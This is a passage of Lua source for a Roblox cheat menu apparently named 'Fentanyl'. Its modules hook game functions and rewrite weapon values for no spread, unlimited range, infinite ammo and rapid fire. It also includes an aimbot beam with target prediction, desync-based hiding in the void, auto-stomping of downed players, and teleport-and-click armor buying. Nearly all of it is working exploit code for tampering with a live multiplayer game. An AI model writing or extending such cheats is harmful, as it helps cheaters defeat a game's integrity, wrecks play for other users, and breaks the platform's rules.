                -- Проверяем аргументы для spread
                if (#args == 0) or 
                   (args[1] == -0.05 and args[2] == 0.05) or 
                   (args[1] == -0.1) or
                   (args[1] == -0.05) then
                    
                    -- Если NoSpread включен, возвращаем минимальный spread (1% от оригинала)
                    local originalResult = old(...)
                    return originalResult * 0.01 -- 1% spread
                end
                
                return old(...)
            end)
            
            NoSpreadFramework.originalMathRandom = old
            
            NoSpreadFramework.enabled = true
            print("[NoSpread] Framework started - bullet spread reduced to 1%")
        end
        
        function NoSpreadFramework.stop()
            if not NoSpreadFramework.enabled then
                return
            end
            
            -- Восстанавливаем оригинальную функцию math.random
            if NoSpreadFramework.originalMathRandom then
                pcall(function()
                    hookfunction(math.random, NoSpreadFramework.originalMathRandom)
                end)
            end
            
            NoSpreadFramework.enabled = false
            NoSpreadFramework.originalMathRandom = nil
            NoSpreadFramework.hookedFunction = nil
            print("[NoSpread] Framework stopped - original bullet spread restored")
        end
        
        _G.NoSpreadFramework = NoSpreadFramework
    end
    
    do -- Infinity Range Framework
        local InfinityRangeFramework = {
            enabled = false,
            connection = nil,
            originalValues = {}
        }
        
        local function findRangeValues(weapon)
            local rangeValues = {}
            
            -- Прямой поиск в оружии
            local range = weapon:FindFirstChild("Range") or 
                         weapon:FindFirstChild("MaxRange") or 
                         weapon:FindFirstChild("Distance") or
                         weapon:FindFirstChild("MaxDistance") or
                         weapon:FindFirstChild("Reach")
            if range then
                p(rangeValues, range)
            end
            
            -- Поиск в Configuration/Settings
            local config = weapon:FindFirstChild("Configuration") or 
                          weapon:FindFirstChild("Settings") or
                          weapon:FindFirstChild("Config") or
                          weapon:FindFirstChild("Stats")
            if config then
                local configRange = config:FindFirstChild("Range") or 
                                   config:FindFirstChild("MaxRange") or
                                   config:FindFirstChild("Distance") or
                                   config:FindFirstChild("MaxDistance") or
                                   config:FindFirstChild("Reach") or
                                   config:FindFirstChild("FireRange")
                if configRange then
                    p(rangeValues, configRange)
                end
            end
            
            -- Поиск в Handle
            local handle = weapon:FindFirstChild("Handle")
            if handle then
                local handleRange = handle:FindFirstChild("Range") or 
                                   handle:FindFirstChild("MaxRange") or
                                   handle:FindFirstChild("Distance")
                if handleRange then
                    p(rangeValues, handleRange)
                end
                
                -- Поиск в Handle/Configuration
                local handleConfig = handle:FindFirstChild("Configuration") or 
                                    handle:FindFirstChild("Settings")
                if handleConfig then
                    local hcRange = handleConfig:FindFirstChild("Range") or 
                                   handleConfig:FindFirstChild("MaxRange") or
                                   handleConfig:FindFirstChild("Distance")
                    if hcRange then
                        p(rangeValues, hcRange)
                    end
                end
            end
            
            -- Поиск в GunScript или аналогичных скриптах
            local gunScript = weapon:FindFirstChild("GunScript") or 
                             weapon:FindFirstChild("WeaponScript") or
                             weapon:FindFirstChild("Script")
            if gunScript then
                local scriptRange = gunScript:FindFirstChild("Range") or 
                                   gunScript:FindFirstChild("MaxRange")
                if scriptRange then
                    p(rangeValues, scriptRange)
                end
            end
            
            return rangeValues
        end
        
        local function updateRange(weapon)
            local rangeValues = findRangeValues(weapon)
            
            for _, rangeValue in ipairs(rangeValues) do
                if rangeValue:IsA("NumberValue") or rangeValue:IsA("IntValue") then
                    -- Сохраняем оригинальное значение если еще не сохранили
                    local key = tostring(weapon) .. "_" .. tostring(rangeValue)
                    if InfinityRangeFramework.enabled then
                        if not InfinityRangeFramework.originalValues[key] then
                            InfinityRangeFramework.originalValues[key] = rangeValue.Value
                        end
                        -- Устанавливаем огромное значение
                        rangeValue.Value = 999999999999999999
                    else
                        -- Восстанавливаем оригинальное значение
                        if InfinityRangeFramework.originalValues[key] then
                            rangeValue.Value = InfinityRangeFramework.originalValues[key]
                        end
                    end
                end
            end
        end
        
        function InfinityRangeFramework.setEnabled(state)
            InfinityRangeFramework.enabled = state
            
            if state and not InfinityRangeFramework.connection then
                InfinityRangeFramework.connection = E.new_connection(b.Heartbeat, function()
                    if not InfinityRangeFramework.enabled then
                        return
                    end
                    
                    -- Ищем оружие в руках
                    local character = g.Character
                    if character then
                        local tool = character:FindFirstChildOfClass("Tool")
                        if tool then
                            pcall(function()
                                updateRange(tool)
                            end)
                        end
                    end
                    
                    -- Ищем оружие в workspace.Players
                    local playersFolder = workspace:FindFirstChild("Players")
                    if playersFolder then
                        local playerFolder = playersFolder:FindFirstChild(g.Name)
                        if playerFolder then
                            for _, child in ipairs(playerFolder:GetChildren()) do
                                local name = child.Name
                                if name:match("%[.+%]") or 
                                   name:match("Gun") or 
                                   name:match("Pistol") or 
                                   name:match("Rifle") or
                                   name:match("Shotgun") or
                                   name:match("Revolver") then
                                    pcall(function()
                                        updateRange(child)
                                    end)
                                end
                            end
                        end
                    end
                end)
            elseif not state then
                -- Восстанавливаем все оригинальные значения
                local character = g.Character
                if character then
                    local tool = character:FindFirstChildOfClass("Tool")
                    if tool then
                        pcall(function()
                            updateRange(tool)
                        end)
                    end
                end
                
                local playersFolder = workspace:FindFirstChild("Players")
                if playersFolder then
                    local playerFolder = playersFolder:FindFirstChild(g.Name)
                    if playerFolder then
                        for _, child in ipairs(playerFolder:GetChildren()) do
                            pcall(function()
                                updateRange(child)
                            end)
                        end
                    end
                end
                
                if InfinityRangeFramework.connection then
                    InfinityRangeFramework.connection:Disconnect()
                    InfinityRangeFramework.connection = nil
                end
                
                -- Очищаем сохраненные значения
                InfinityRangeFramework.originalValues = {}
            end
        end
        
        _G.InfinityRangeFramework = InfinityRangeFramework
    end
    
    do -- Infinity Ammo Framework
        local InfinityAmmoFramework = {
            enabled = false,
            connection = nil
        }
        
        local function updateAmmo()
            -- Работаем только через workspace.Players
            local playersFolder = workspace:FindFirstChild("Players")
            if not playersFolder then return end
            
            local playerFolder = playersFolder:FindFirstChild(g.Name)
            if not playerFolder then return end
            
            -- Проходим по всем объектам в папке игрока
            for _, weapon in ipairs(playerFolder:GetChildren()) do
                local name = weapon.Name
                -- Проверяем типичные паттерны названий оружия
                if name:match("%[.+%]") or -- [Revolver], [Shotgun] и т.д.
                   name:match("Gun") or 
                   name:match("Pistol") or 
                   name:match("Rifle") or
                   name:match("Shotgun") or
                   name:match("Revolver") or
                   name:match("SMG") or
                   name:match("AK") or
                   name:match("Glock") or
                   name:match("Weapon") then
                    
                    -- Ищем патроны в оружии
                    local ammoValue = weapon:FindFirstChild("Ammo") or 
                                     weapon:FindFirstChild("Bullets") or 
                                     weapon:FindFirstChild("Clip") or
                                     weapon:FindFirstChild("CurrentAmmo")
                    
                    local maxAmmoValue = weapon:FindFirstChild("MaxAmmo") or 
                                        weapon:FindFirstChild("MaxBullets") or 
                                        weapon:FindFirstChild("ClipSize") or
                                        weapon:FindFirstChild("MaxClip")
                    
                    -- Если не нашли, ищем в Configuration
                    if not ammoValue then
                        local config = weapon:FindFirstChild("Configuration") or 
                                      weapon:FindFirstChild("Settings") or
                                      weapon:FindFirstChild("Config")
                        if config then
                            ammoValue = config:FindFirstChild("Ammo") or 
                                       config:FindFirstChild("Bullets") or
                                       config:FindFirstChild("CurrentAmmo")
                            maxAmmoValue = maxAmmoValue or config:FindFirstChild("MaxAmmo") or 
                                          config:FindFirstChild("MaxBullets") or
                                          config:FindFirstChild("ClipSize")
                        end
                    end
                    
                    -- Если не нашли, ищем в Handle
                    if not ammoValue then
                        local handle = weapon:FindFirstChild("Handle")
                        if handle then
                            ammoValue = handle:FindFirstChild("Ammo") or 
                                       handle:FindFirstChild("Bullets")
                            maxAmmoValue = maxAmmoValue or handle:FindFirstChild("MaxAmmo") or 
                                          handle:FindFirstChild("MaxBullets")
                        end
                    end
                    
                    -- Обновляем патроны если нашли
                    if ammoValue and maxAmmoValue then
                        if (ammoValue:IsA("NumberValue") or ammoValue:IsA("IntValue")) and
                           (maxAmmoValue:IsA("NumberValue") or maxAmmoValue:IsA("IntValue")) then
                            if ammoValue.Value ~= maxAmmoValue.Value then
                                ammoValue.Value = maxAmmoValue.Value
                            end
                        end
                    elseif ammoValue and not maxAmmoValue then
                        -- Если нет максимального значения, устанавливаем большое число
                        if ammoValue:IsA("NumberValue") or ammoValue:IsA("IntValue") then
                            if ammoValue.Value < 999 then
                                ammoValue.Value = 999
                            end
                        end
                    end
                end
            end
        end
        
        function InfinityAmmoFramework.setEnabled(state)
            InfinityAmmoFramework.enabled = state
            
            if state and not InfinityAmmoFramework.connection then
                InfinityAmmoFramework.connection = E.new_connection(b.Heartbeat, function()
                    if not InfinityAmmoFramework.enabled then
                        return
                    end
                    
                    pcall(updateAmmo)
                end)
            elseif not state and InfinityAmmoFramework.connection then
                InfinityAmmoFramework.connection:Disconnect()
                InfinityAmmoFramework.connection = nil
            end
        end
        
        _G.InfinityAmmoFramework = InfinityAmmoFramework
    end
    
    do -- Rapid Fire Framework
        local RapidFireFramework = {
            enabled = false,
            original = {},
            connection = nil
        }
        
        function RapidFireFramework.setEnabled(state)
            RapidFireFramework.enabled = state
            
            if state and not RapidFireFramework.connection then
                RapidFireFramework.connection = E.new_connection(b.RenderStepped, function()
                    if not RapidFireFramework.enabled then
                        return
                    end
                    
                    local tool = g.Character and g.Character:FindFirstChildOfClass("Tool")
                    if tool and tool:FindFirstChild("GunScript") then
                        for _, connection in ipairs(getconnections(tool.Activated)) do
                            local func = connection.Function
                            if func then
                                local funcInfo = debug.getinfo(func)
                                for i = 1, funcInfo.nups do
                                    local c, _n = debug.getupvalue(func, i)
                                    if type(c) == "number" then
                                        if not RapidFireFramework.original[i] then
                                            RapidFireFramework.original[i] = c
                                        end
                                        debug.setupvalue(func, i, RapidFireFramework.enabled and 0.00000000000000000001 or RapidFireFramework.original[i])
                                    end
                                end
                            end
                        end
                    end
                end)
            elseif not state and RapidFireFramework.connection then
                -- Восстанавливаем оригинальные значения
                local tool = g.Character and g.Character:FindFirstChildOfClass("Tool")
                if tool and tool:FindFirstChild("GunScript") then
                    for _, connection in ipairs(getconnections(tool.Activated)) do
                        local func = connection.Function
                        if func then
                            local funcInfo = debug.getinfo(func)
                            for i = 1, funcInfo.nups do
                                local c, _n = debug.getupvalue(func, i)
                                if type(c) == "number" and RapidFireFramework.original[i] then
                                    debug.setupvalue(func, i, RapidFireFramework.original[i])
                                end
                            end
                        end
                    end
                end
                
                if RapidFireFramework.connection then
                    RapidFireFramework.connection:Disconnect()
                    RapidFireFramework.connection = nil
                end
                RapidFireFramework.original = {}
            end
        end
        
        _G.RapidFireFramework = RapidFireFramework
    end
    
    do -- Beam Visualization
        local currentBeam = nil
        local beamConnection = nil
        
        local function CreateBeam()
            if currentBeam then
                currentBeam:Destroy()
                currentBeam = nil
            end
            
            local beam = Instance.new("Beam")
            beam.Color = ColorSequence.new(z(255, 0, 0))
            beam.Transparency = NumberSequence.new(0.3)
            beam.Width0 = 0.08
            beam.Width1 = 0.08
            beam.FaceCamera = true
            
            local attachment0 = Instance.new("Attachment")
            local attachment1 = Instance.new("Attachment")
            
            attachment0.Parent = workspace
            attachment1.Parent = workspace
            
            beam.Attachment0 = attachment0
            beam.Attachment1 = attachment1
            beam.Parent = workspace
            
            currentBeam = {beam = beam, att0 = attachment0, att1 = attachment1}
            return currentBeam
        end
        
        local function UpdateBeam()
            if not K.Flags["ShowAimbot"] or not K.Flags["AimbotEnabled"] or not K.Flags["TargetingEnabled"] then
                if currentBeam then
                    currentBeam.beam:Destroy()
                    currentBeam.att0:Destroy()
                    currentBeam.att1:Destroy()
                    currentBeam = nil
                end
                return
            end
            
            if not _G.targeting_state or not _G.targeting_state.current then
                if currentBeam then
                    currentBeam.beam:Destroy()
                    currentBeam.att0:Destroy()
                    currentBeam.att1:Destroy()
                    currentBeam = nil
                end
                return
            end
            
            if not currentBeam then
                currentBeam = CreateBeam()
            end
            
            -- Проверяем наличие оружия с handle
            local tool = _G.TargetingFramework and _G.TargetingFramework.utility and _G.TargetingFramework.utility:getHeld()
            if not tool or tool == "None" or not tool.Handle then
                if currentBeam then
                    currentBeam.beam:Destroy()
                    currentBeam.att0:Destroy()
                    currentBeam.att1:Destroy()
                    currentBeam = nil
                end
                return
            end
            
            if not tool.Handle then return end
            local origin = tool.Handle.Position
            
            local targetPlayer = _G.targeting_state.current
            local targetPart = targetPlayer.Character and (targetPlayer.Character:FindFirstChild("HumanoidRootPart") or targetPlayer.Character:FindFirstChild("Head"))
            if not targetPart then return end
            
            local function GetPredictedPosition(targetPlayer)
                if not targetPlayer or not targetPlayer.Character then return nil end
                
                local targetPart = targetPlayer.Character:FindFirstChild("HumanoidRootPart") or targetPlayer.Character:FindFirstChild("Head")
                if not targetPart then return nil end
                
                -- Получаем актуальные значения из UI
                local xzPrediction = tonumber(K.Flags["AimbotXZPrediction"]) or 0.048
                local yPrediction = tonumber(K.Flags["AimbotYPrediction"]) or 0.048
                local velocity = targetPart.Velocity or B(0, 0, 0)
                
                -- Используем логику как в примере кода
                local predicted = targetPart.Position + B(
                    velocity.X * xzPrediction,
                    velocity.Y * yPrediction,
                    velocity.Z * xzPrediction
                )
                
                return predicted
            end
            
            local predictedPos = GetPredictedPosition(targetPlayer)
            currentBeam.att0.WorldPosition = origin
            currentBeam.att1.WorldPosition = predictedPos
        end
        
        -- Инициализация beam connection отложена до включения функции
        local function StartBeamVisualization()
            if beamConnection then
                beamConnection:Disconnect()
            end
            beamConnection = b.Heartbeat:Connect(UpdateBeam)
        end
        
        local function StopBeamVisualization()
            if beamConnection then
                beamConnection:Disconnect()
                beamConnection = nil
            end
            if currentBeam then
                currentBeam.beam:Destroy()
                currentBeam.att0:Destroy()
                currentBeam.att1:Destroy()
                currentBeam = nil
            end
        end
        
        _G.BeamVisualization = {
            StartBeamVisualization = StartBeamVisualization,
            StopBeamVisualization = StopBeamVisualization,
            cleanup = function()
                StopBeamVisualization()
            end
        }
    end
    
    do -- Hide Framework
        local HideFramework = {}
        local hideConnection = nil
        local isHiding = false
        local isPaused = false
        local lastHideTime = 0
        local hideInterval = 0.1
        
        local function getRandomVoidPosition()
            local x = h() * 5000 - 1000 -- random от -1000 до 1000
            local y = -100000 -- -math.huge
            local z = h() * 5000 - 1000 -- random от -1000 до 1000
            return B(x, y, z)
        end
        
        function HideFramework.start()
            if isHiding then return end
            
            isHiding = true
            K:Notification("Hide enabled", 2, z(128, 0, 128))
            
            hideConnection = b.Heartbeat:Connect(function()
                if not isHiding then
                    if hideConnection then
                        hideConnection:Disconnect()
                        hideConnection = nil
                    end
                    return
                end
                
                -- Проверяем паузу
                if isPaused then
                    -- Просто выходим на паузе, не синхронизируемся
                    return
                end
                
                -- Проверяем флаг
                if not K.Flags["HideEnabled"] then
                    if hideConnection then
                        hideConnection:Disconnect()
                        hideConnection = nil
                    end
                    isHiding = false
                    return
                end
                
                -- Используем десинк для прятания в войде
                if getgenv().DesyncLibrary then
                    local currentTime = os.clock()
                    if currentTime - lastHideTime >= hideInterval then
                        lastHideTime = currentTime
                        local voidPos = getRandomVoidPosition()
                        getgenv().DesyncLibrary.movedesyncto(voidPos.X, voidPos.Y, voidPos.Z)
                    end
                end
            end)
        end
        
        function HideFramework.stop()
            isHiding = false
            isPaused = false
            
            if hideConnection then
                hideConnection:Disconnect()
                hideConnection = nil
            end
            
            -- Синхронизируемся при остановке
            if getgenv().DesyncLibrary then
                getgenv().DesyncLibrary.SynchronizeSyncWithPlayer()
            end
            
            K:Notification("Hide disabled", 2, z(255, 0, 0))
        end
        
        function HideFramework.pause()
            isPaused = true
        end
        
        function HideFramework.resume()
            isPaused = false
            -- При возобновлении сразу применяем Hide позицию если фреймворк активен
            if isHiding and getgenv().DesyncLibrary then
                local voidPos = getRandomVoidPosition()
                getgenv().DesyncLibrary.movedesyncto(voidPos.X, voidPos.Y, voidPos.Z)
                print("[Hide] Resumed and applied hide position")
            end
        end
        
        function HideFramework.isEnabled()
            return isHiding
        end
        
        function HideFramework.isPaused()
            return isPaused
        end
        
        _G.HideFramework = HideFramework
    end
    
    do -- Auto Stomp Framework
        local AutoStompFramework = {}
        local stompConnection = nil
        local isStomping = false
        local isPaused = false
        local lastStompTime = 0
        local stompInterval = 0.1
        
        local function isPlayerKO(player)
            if not player or not player.Character then return false end
            
            local bodyEffects = player.Character:FindFirstChild("BodyEffects")
            if not bodyEffects then return false end
            
            local ko = bodyEffects:FindFirstChild("K.O")
            if ko and ko.Value == true then return true end
            
            return false
        end
        
        local function performStomp()
            local args = {"Stomp"}
            local mainRemoteEvent = game:GetService("ReplicatedStorage"):WaitForChild("MainRemotes"):WaitForChild("MainRemoteEvent")
            if mainRemoteEvent then
                mainRemoteEvent:FireServer(unpack(args))
            end
        end
        
        function AutoStompFramework.start()
            if isStomping then return end
            
            isStomping = true
            K:Notification("Auto Stomp enabled", 2, z(0, 255, 0))
            
            -- Простой подход с проверкой паузы
            stompConnection = b.Heartbeat:Connect(function()
                if not isStomping then
                    if stompConnection then
                        stompConnection:Disconnect()
                        stompConnection = nil
                    end
                    return
                end
                
                -- Проверяем паузу
                if isPaused then
                    -- Просто выходим на паузе, не синхронизируемся
                    return
                end
                
                local currentTarget = _G.TargetingFramework:GetCurrentTarget()
                
                -- Проверяем приоритет Hide ТОЛЬКО если нет K.O цели
                -- Если есть K.O цель, AutoStomp имеет приоритет над Hide
                if not currentTarget or not currentTarget.Character or not isPlayerKO(currentTarget) then
                    -- Нет K.O цели - Hide может блокировать AutoStomp
                    if _G.HideFramework and _G.HideFramework.isEnabled() and not _G.HideFramework.isPaused() then
                        return
                    end
                end
                if not currentTarget then 
                    -- Синхронизируемся только если НЕ на паузе (чтобы не мешать AutoArmor)
                    if not isPaused and getgenv().DesyncLibrary then
                        pcall(function()
                            getgenv().DesyncLibrary.SynchronizeSyncWithPlayer()
                        end)
                    end
                    return 
                end
                
                if not currentTarget.Character then 
                    -- Синхронизируемся только если НЕ на паузе (чтобы не мешать AutoArmor)
                    if not isPaused and getgenv().DesyncLibrary then
                        pcall(function()
                            getgenv().DesyncLibrary.SynchronizeSyncWithPlayer()
                        end)
                    end
                    return 
                end
                
                if not isPlayerKO(currentTarget) then 
                    -- Синхронизируемся только если НЕ на паузе (чтобы не мешать AutoArmor)
                    if not isPaused and getgenv().DesyncLibrary then
                        pcall(function()
                            getgenv().DesyncLibrary.SynchronizeSyncWithPlayer()
                        end)
                    end
                    -- Возобновляем Hide если он был приостановлен
                    if _G.HideFramework and _G.HideFramework.isEnabled() and _G.HideFramework.isPaused() then
                        _G.HideFramework.resume()
                    end
                    return 
                end
                
                -- Если дошли до сюда - есть K.O цель, приостанавливаем Hide если он активен
                if _G.HideFramework and _G.HideFramework.isEnabled() and not _G.HideFramework.isPaused() then
                    _G.HideFramework.pause()
                end
                
                local upperTorso = currentTarget.Character:FindFirstChild("UpperTorso")
                if not upperTorso then return end
                
                -- Используем десинк для стомпа
                if getgenv().DesyncLibrary then
                    local pos = upperTorso.Position
                    getgenv().DesyncLibrary.movedesyncto(pos.X, pos.Y + 1, pos.Z)
                    
                    local currentTime = os.clock()
                    if currentTime - lastStompTime >= stompInterval then
                        lastStompTime = currentTime
                        performStomp()
                    end
                end
            end)
        end
        
        function AutoStompFramework.stop()
            isStomping = false
            isPaused = false
            
            if stompConnection then
                stompConnection:Disconnect()
                stompConnection = nil
            end
            
            -- Синхронизируемся при остановке
            if getgenv().DesyncLibrary then
                getgenv().DesyncLibrary.SynchronizeSyncWithPlayer()
            end
            
            K:Notification("Auto Stomp disabled", 2, z(255, 0, 0))
        end
        
        function AutoStompFramework.pause()
            isPaused = true
        end
        
        function AutoStompFramework.resume()
            isPaused = false
        end
        
        function AutoStompFramework.isEnabled()
            return isStomping
        end
        
        _G.AutoStompFramework = AutoStompFramework
    end

    do -- AutoArmor Framework
        local AutoArmorFramework = {}
        local armorConnection = nil
        local ARMOR_THRESHOLD = 199
        local isBuying = false
        
        local function GetArmorItem()
            local shop = workspace.Ignored and workspace.Ignored.Shop
            if shop then
                local armorItem = shop:FindFirstChild("[Full Armor] - $1659")
                return armorItem
            end
            return nil
        end
        
        local function BuyArmor()
            if not K.Flags["AutoArmorEnabled"] then 
                return 
            end
            if isBuying then 
                print("[AutoArmor] Already buying, skipping")
                return 
            end
            
            local player = g
            if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
                print("[AutoArmor] No character or HumanoidRootPart")
                return
            end
            
            if not player.Character:FindFirstChild("BodyEffects") or 
               not player.Character.BodyEffects:FindFirstChild("Armor") then 
                print("[AutoArmor] No BodyEffects or Armor")
                return
            end
            
            local armorItem = GetArmorItem()
            if not armorItem then 
                print("[AutoArmor] Armor item not found in shop")
                return 
            end
            
            local currentArmor = player.Character.BodyEffects.Armor.Value
            print("[AutoArmor] Current armor:", currentArmor, "Threshold:", ARMOR_THRESHOLD)
            
            if currentArmor > ARMOR_THRESHOLD then 
                return 
            end
            
            print("[AutoArmor] Starting armor purchase, current armor:", currentArmor)
            isBuying = true
            
            -- ОСТАНАВЛИВАЕМ другие фреймворки если они включены (приоритет AutoArmor)
            local wasStompEnabled = false
            local wasHideEnabled = false
            
            if _G.AutoStompFramework and _G.AutoStompFramework.isEnabled() then
                wasStompEnabled = true
                print("[AutoArmor] Pausing AutoStomp")
                _G.AutoStompFramework.pause()
            end
            
            if _G.HideFramework and _G.HideFramework.isEnabled() then
                wasHideEnabled = true
                print("[AutoArmor] Pausing Hide")
                _G.HideFramework.pause()
            end
            
            -- Используем новый desync фреймворк для покупки
            if getgenv().DesyncLibrary then
                K:Notification("[DEBUG] Buying armor, stomp paused: " .. tostring(wasStompEnabled), 3, z(255, 255, 0))
                print("[AutoArmor] Moving to armor shop with desync")
                
                local success, err = pcall(function()
                    -- Перемещаемся к объекту брони через новый desync API
                    getgenv().DesyncLibrary.movedesyncto(armorItem.Head.CFrame)
                    wait(0.3)
                    
                    print("[AutoArmor] Clicking armor detector")
                    -- Покупаем броню
                    fireclickdetector(armorItem.ClickDetector)
                    wait(0.5)
                    
                    print("[AutoArmor] Syncing with player")
                    -- Синхронизируемся с локальным игроком
                    getgenv().DesyncLibrary.SynchronizeSyncWithPlayer()
                    
                    -- Проверяем, нужно ли восстановить Hide после синхронизации
                    task.wait(0.1) -- Небольшая задержка после синхронизации
                    if _G.HideFramework and _G.HideFramework.isEnabled() and not _G.HideFramework.isPaused() then
                        local x = h() * 5000 - 1000
                        local y = -100000
                        local z = h() * 5000 - 1000
                        getgenv().DesyncLibrary.movedesyncto(x, y, z)
                        print("[AutoArmor] Restored Hide position after sync")
                    end
                end)
                
                if not success then
                    print("[AutoArmor] Error during purchase:", err)
                    -- В случае ошибки синхронизируемся с локальным игроком
                    pcall(function()
                        getgenv().DesyncLibrary.SynchronizeSyncWithPlayer()
                        
                        -- Проверяем, нужно ли восстановить Hide после синхронизации
                        task.wait(0.1)
                        if _G.HideFramework and _G.HideFramework.isEnabled() and not _G.HideFramework.isPaused() then
                            local x = h() * 5000 - 1000
                            local y = -100000
                            local z = h() * 5000 - 1000
                            getgenv().DesyncLibrary.movedesyncto(x, y, z)
                            print("[AutoArmor] Restored Hide position after error sync")
                        end
                    end)
                end
                
                -- Проверяем броню после покупки
                wait(0.2)
                local newArmor = player.Character.BodyEffects.Armor.Value
                print("[AutoArmor] Armor after purchase:", newArmor)
                
                if newArmor >= 200 then
                    K:Notification("[DEBUG] Armor bought: " .. newArmor, 3, z(0, 255, 0))
                else
                    K:Notification("[DEBUG] Armor purchase failed: " .. newArmor, 3, z(255, 0, 0))
                end
            else
                print("[AutoArmor] DesyncLibrary not found!")
            end
            
            -- ВОЗОБНОВЛЯЕМ другие фреймворки если они были включены
            if wasHideEnabled and _G.HideFramework then
                print("[AutoArmor] Resuming Hide")
                _G.HideFramework.resume()
            end
            
            if wasStompEnabled and _G.AutoStompFramework then
                print("[AutoArmor] Resuming AutoStomp")
                _G.AutoStompFramework.resume()
                K:Notification("[DEBUG] Frameworks resumed", 2, z(0, 255, 255))
            end
            
            isBuying = false
            print("[AutoArmor] Purchase cycle completed")
        end
        
        local function StartAutoArmor()
            if armorConnection then
                armorConnection:Disconnect()
                armorConnection = nil
            end
            
            if K.Flags["AutoArmorEnabled"] then
                print("[AutoArmor] Starting AutoArmor framework")
                local lastCheck = 0
                armorConnection = b.Heartbeat:Connect(function()
                    -- Проверяем флаг каждый кадр
                    if not K.Flags["AutoArmorEnabled"] then
                        if armorConnection then
                            armorConnection:Disconnect()
                            armorConnection = nil
                        end
                        return
                    end
                    
                    local currentTime = os.clock()
                    if currentTime - lastCheck >= 1 then
                        lastCheck = currentTime
                        BuyArmor()
                    end
                end)
            end
        end
        
        AutoArmorFramework.start = StartAutoArmor
        AutoArmorFramework.stop = function()
            if armorConnection then
                armorConnection:Disconnect()
                armorConnection = nil
            end
        end
        
        -- Обработка смерти игрока
        local function OnCharacterRemoving()
            if getgenv().DesyncLibrary then
                pcall(function()
                    getgenv().DesyncLibrary.StopDesync()
                end)
            end
        end
        
        local function OnCharacterAdded(character)
            if character then
                local humanoid = character:WaitForChild("Humanoid", 5)
                if humanoid then
                    humanoid.Died:Connect(OnCharacterRemoving)
                end
            end
        end
        
        -- Подключаем обработчики смерти
        g.CharacterRemoving:Connect(OnCharacterRemoving)
        g.CharacterAdded:Connect(OnCharacterAdded)
        
        -- Если персонаж уже существует
        if g.Character then
            OnCharacterAdded(g.Character)
        end
        
        _G.AutoArmorFramework = AutoArmorFramework
    end
end -- End Ragebot Tab
do -- Watermark & Keybinds
    local Q = K:Watermark("Fentanyl | " .. g.Name .. " | " .. os.date("%y.%m.%d") .. " | Premium")
    local R = K:KeybindList()
    if Q then
        Q:SetVisibility(false)
    end
    if R then
        R:SetVisibility(false)
    end
    _G.Watermark = Q
    _G.KeybindList = R
end
do -- Settings Tab
    local S = L:Page({Name = "Settings", Columns = 2})
    local T = S:Section({Name = "Config", Side = 1})
    local U = ""
    local V = ""
    local _W = {}
    do
        if not isfolder("fentanyl") then
            makefolder("fentanyl")
        end
        if not isfolder("fentanyl/Configs") then
            makefolder("fentanyl/Configs")
        end
    end
    local function X()
        local configList = {}
        if isfolder("fentanyl/Configs") then
            for J, Y in ipairs(listfiles("fentanyl/Configs")) do
                local Z = Y:gsub("\\", "/")
                Z = Z:gsub("fentanyl/Configs/", "")
                p(configList, Z)
            end
        end
        return configList
    end
    local _ =
        T:Listbox(
        {Name = "Select Config", Items = X(), Default = "", Flag = "SelectedConfig", Callback = function(a0)
                U = a0
                print("Selected config:", a0)
            end}
    )
    local a1 =
        T:Textbox(
        {Name = "", Default = "", Placeholder = "Enter config name...", Flag = "ConfigName", Callback = function(a0)
                V = a0
            end}
    )
    local a2 =
        T:Button(
        {Name = "Create Config", Callback = function()
                if V and V ~= "" then
                    local a3 = V:gsub("%.json$", "") .. ".json"
                    local a4 = "fentanyl/Configs/" .. a3
                    if not isfile(a4) then
                        local a5 = K:GetConfig()
                        writefile(a4, a5)
                        K:Notification("Config created: " .. a3, 3, z(0, 255, 0))
                        _:Refresh(X())
                    else
                        K:Notification("Config already exists: " .. a3, 3, z(255, 0, 0))
                    end
                else
                    K:Notification("Please enter a config name", 3, z(255, 255, 0))
                end
            end}
    )
    local a6 =
        T:Button(
        {Name = "Save Config", Callback = function()
                local a3
                if U and U ~= "" then
                    a3 = U
                elseif V and V ~= "" then
                    a3 = V:gsub("%.json$", "") .. ".json"
                end
                if a3 then
                    local a4 = "fentanyl/Configs/" .. a3
                    local a5 = K:GetConfig()
                    writefile(a4, a5)
                    K:Notification("Config saved: " .. a3, 3, z(0, 255, 0))
                    _:Refresh(X())
                else
                    K:Notification("Please select or enter a config name", 3, z(255, 255, 0))
                end
            end}
    )
    local a7 =
        T:Button(
        {Name = "Load Config", Callback = function()
                if U and U ~= "" then
                    local a4 = "fentanyl/Configs/" .. U
                    if isfile(a4) then
                        local a5 = readfile(a4)
                        K:LoadConfig(a5)
                        K:Notification("Config loaded: " .. U, 3, z(0, 255, 0))
                    else
                        K:Notification("Config not found: " .. U, 3, z(255, 0, 0))
                    end
                else
                    K:Notification("Please select a config", 3, z(255, 255, 0))
                end
            end}
    )
    local a8 =
        T:Button(
        {Name = "Delete Config", Risky = true, Callback = function()
                if U and U ~= "" then
                    local a4 = "fentanyl/Configs/" .. U
                    print("Trying to delete config at path:", a4)
                    print("File exists:", isfile(a4))
                    if isfile(a4) then
                        delfile(a4)
                        K:Notification("Config deleted: " .. U, 3, z(0, 255, 0))
                        _:Refresh(X())
                        U = ""
                    else
                        K:Notification("Config not found: " .. a4, 5, z(255, 0, 0))
                    end
                else
                    K:Notification("Please select a config", 3, z(255, 255, 0))
                end
            end}
    )
    local a9 =
        T:Button(
        {Name = "Refresh Config List", Callback = function()
                _:Refresh(X())
                K:Notification("Config list refreshed", 2, z(0, 255, 0))
            end}
    )
    local aa = S:Section({Name = "Theming", Side = 2})
    local ab = aa:Label("Accent Color", "Left")
    local ac =
        ab:Colorpicker(
        {
            Name = "Accent Color",
            Default = z(31, 226, 130),
            Alpha = 1,
            Flag = "ThemeAccentColor",
            Callback = function(ad, ae)
                K:ChangeTheme("Accent", ad)
                if L.GradientTitle and L.GradientTitle.Enabled then
                    L.GradientTitle.Start = ad
                    L.GradientTitle.Middle = ad
                    L.GradientTitle.End = ad
                end
            end
        }
    )
    local af = aa:Label("Window Background", "Left")
    local ag =
        af:Colorpicker(
        {
            Name = "Window Background",
            Default = z(43, 43, 43),
            Alpha = 1,
            Flag = "ThemeWindowBackground",
            Callback = function(ad, ae)
                K:ChangeTheme("Window Background", ad)
            end
        }
    )
    local ah = aa:Label("Text Color", "Left")
    local ai =
        ah:Colorpicker(
        {
            Name = "Text Color",
            Default = z(180, 180, 180),
            Alpha = 1,
            Flag = "ThemeTextColor",
            Callback = function(ad, ae)
                K:ChangeTheme("Text", ad)
            end
        }
    )
    local aj = aa:Label("Section Background", "Left")
    local ak =
        aj:Colorpicker(
        {
            Name = "Section Background",
